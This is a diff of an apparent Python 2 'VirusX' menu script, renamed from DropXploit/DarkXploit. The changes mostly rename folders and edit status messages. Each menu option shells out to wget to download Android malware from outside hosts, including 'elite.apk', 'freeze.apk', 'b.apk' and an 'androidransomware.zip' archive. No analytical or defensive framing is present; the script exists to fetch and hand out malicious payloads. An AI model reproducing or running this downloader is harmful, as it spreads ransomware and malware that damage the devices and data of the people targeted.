@@ -35,21 +35,21 @@ def main():
     main()
     
     ############
-    ### VIRUS1 ###
+    ###VIRUS1###
     ###########
   elif dr == "00":
 		android = raw_input(""+R+"Virus"+B+"X > ")
 		if android == "run":
 			time.sleep(1)
-			print (""+G+"Bootlop")
+			print (""+G+"Bootloop")
 			time.sleep(2)
 			print
 			print ""+B+"[*] "+N+"Downloading..."
 			time.sleep(1)
 			os.system("cd virus;mkdir elite;cd elite;wget http://zumizec-com.waper.co/files/elite.apk")
 			print
-			print "Now check folder Virus on "+R+"/DropXploit/virus/elite/"+N+""
-			print ""+B+"[*]"+N+"Job finished..."
+			print "Now check folder Virus on "+R+"/VirusX/virus/elite/"+N+""
+			print ""+B+"[*]"+N+"Done..."
 			print
 			main()
   elif dr == "01":
@@ -60,9 +60,9 @@ def main():
 			print ""+B+"[*]"+N+" Downloading virus..."
 			os.system("cd virus;mkdir freeze;cd freeze;wget http://zumizec-com.waper.co/files/freeze.apk")
 			print
-			print "Now check folder virus on"+R+" /DarkXploit/virus/freeze/"
+			print "Now check folder virus on"+R+" /VirusX/virus/freeze/"
 			time.sleep(1)
-			print ""+B+"[*]"+N+" Job finished..."
+			print ""+B+"[*]"+N+"Done..."
 			print
 			main()
   elif dr == "02":
@@ -71,12 +71,12 @@ def main():
 			time.sleep(1)
 			print (""+G+"Ran")
 			print ""+B+"[*]"+N+" Downloading virus..."
-			os.system("cd virus;mkdir android-ransomware;cd android-ransomware;wget http://loolzec.blogwaper.com/files/androidransomware.zip")
+			os.system("cd virus;mkdir androidran;cd androidran;wget http://loolzec.blogwaper.com/files/androidransomware.zip")
 			time.sleep(1)
 			print
-			print "Now check folder virus on "+R+"/DarkXploit/virus/android-ransomware/"
+			print "Now check folder virus on "+R+"/VirusX/virus/androidran/"
 			time.sleep(1)
-			print ""+B+"[*]"+N+" Job finished"
+			print ""+B+"[*]"+N+"Done..."
 			print
 			main()
   elif dr == "03":
@@ -87,9 +87,9 @@ def main():
 			os.system("cd virus;mkdir malware;cd malware;wget http://loolzec.blogwaper.com/files/b.apk")
 			time.sleep(1)
 			print
-			print "Now check folder virus on "+R+"/DarkXploit/virus/malware/"
+			print "Now check folder virus on "+R+"/VirusX/virus/malware/"
 			time.sleep(1)
-			print ""+B+"[*]"+N+" Job finished"
+			print ""+B+"[*]"+N+"Done..."
 			print
 			main()
     
